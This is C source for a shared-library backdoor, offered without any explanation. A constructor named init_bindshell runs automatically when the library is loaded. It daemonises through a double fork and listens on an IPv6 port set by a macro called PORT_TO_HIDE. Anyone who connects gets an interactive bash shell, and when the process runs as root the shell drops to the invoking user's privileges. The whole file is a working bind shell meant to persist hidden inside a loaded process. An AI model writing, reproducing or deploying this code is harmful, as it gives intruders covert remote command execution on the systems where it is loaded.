#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <pwd.h>
#include <sys/socket.h>
#include <netinet/in.h> 
#include <sys/types.h>
#include <sys/wait.h>
#include <dlfcn.h>

void run_background_listener();

__attribute__((constructor)) void init_bindshell(void) {

    pid_t pid1 = fork();
    if (pid1 < 0) return;

    if (pid1 == 0) {

        pid_t pid2 = fork();
        if (pid2 < 0) exit(1);

        if (pid2 == 0) {
        
            for (int i = 1; i < NSIG; i++) {
                signal(i, SIG_DFL);
            }
            

            run_background_listener();
            exit(0);
        } else {

            exit(0); 
        }
    } else {

        int status;
        waitpid(pid1, &status, 0); 
    }
}

void run_background_listener() {

    struct sigaction sa;
    sa.sa_handler = SIG_IGN;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_RESTART | SA_NOCLDWAIT;
    sigaction(SIGCHLD, &sa, NULL);

    int listen_socket_fd = socket(AF_INET6, SOCK_STREAM, 0);
    if (listen_socket_fd < 0) return;

    int opt = 1;
    setsockopt(listen_socket_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    int v6_only = 1;
    setsockopt(listen_socket_fd, IPPROTO_IPV6, IPV6_V6ONLY, &v6_only, sizeof(v6_only));

    struct sockaddr_in6 addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin6_family = AF_INET6;
    addr.sin6_port = htons(PORT_TO_HIDE);
    addr.sin6_addr = in6addr_any; 

    if (bind(listen_socket_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(listen_socket_fd);
        return;
    }

    if (listen(listen_socket_fd, 5) < 0) {
        close(listen_socket_fd);
        return;
    }

    while (1) {
        int connected_socket_fd = accept(listen_socket_fd, NULL, NULL);
        if (connected_socket_fd < 0) {
            continue; 
        }

        pid_t shell_pid = fork();
        
        if (shell_pid == 0) {
            close(listen_socket_fd); 
            
            dup2(connected_socket_fd, STDIN_FILENO);
            dup2(connected_socket_fd, STDOUT_FILENO);
            dup2(connected_socket_fd, STDERR_FILENO);
            close(connected_socket_fd);

            if (getuid() == 0) { 
                struct passwd *pwd = NULL;
                char *sudo_user = getenv("SUDO_USER");
                if (sudo_user != NULL) {
                    pwd = getpwnam(sudo_user);
                }
                if (pwd == NULL) {
                    char *login_user = getlogin();
                    if (login_user != NULL) {
                        pwd = getpwnam(login_user);
                    }
                }

                if (pwd != NULL) {
                    if (setgid(pwd->pw_gid) != 0 || setuid(pwd->pw_uid) != 0) {
                        exit(1);
                    }
                } else {
                    if (setgid(1000) != 0 || setuid(1000) != 0) {
                        exit(1);
                    }
                }
            }

execl("/bin/bash", "/bin/bash", NULL);
        exit(1); 
        }
        
        close(connected_socket_fd);
    }
}

